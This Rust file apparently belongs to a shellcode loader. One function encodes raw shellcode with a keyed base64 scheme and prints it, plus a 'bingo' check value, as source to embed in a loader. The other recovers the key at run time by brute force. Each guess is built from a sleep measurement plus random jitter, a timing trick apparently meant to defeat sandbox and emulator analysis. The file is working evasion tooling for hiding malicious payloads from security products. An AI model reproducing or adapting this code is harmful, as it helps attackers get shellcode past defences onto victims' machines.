use std::thread::sleep;
use std::time::{Duration, Instant};
use rand::Rng;
use crate::crypt;

pub fn base64_dynamic_decode(check_decode:&str, dynamic_key:u64) -> u64 {
    loop {
        let start_time = Instant::now();
        sleep(Duration::from_millis(100));
        let elapsed_time = start_time.elapsed();
        let ran_time: u64 = rand::thread_rng().gen_range(1..25);
        let ran_xor: u64 = rand::thread_rng().gen_range(1..10);
        let key: u64 = dynamic_key - (elapsed_time.as_millis() as u64 - (ran_time ^ ran_xor));
        println!("{key}");
        match crypt::base64::base64_decode_with_random(check_decode, key) {
            Ok(t) => {
                match String::from_utf8(t) {
                    Ok(t) => unsafe {
                        if t == "bingo" {
                            return key
                        }
                    },
                    Err(_e) => (),
                }
            }
            Err(_e) => {}
        };
    }
}


pub fn base64_dynamic_encode(shellcode:&[u8], dynamic_key:u64){

    let encoded = crypt::base64::base64_encode_with_random(shellcode, dynamic_key);
    let check_decode = crypt::base64::base64_encode_with_random("bingo".as_bytes(), dynamic_key);

    println!("let base_shellcode = {:?};", encoded);
    println!("let check = \"{}\";", check_decode);
}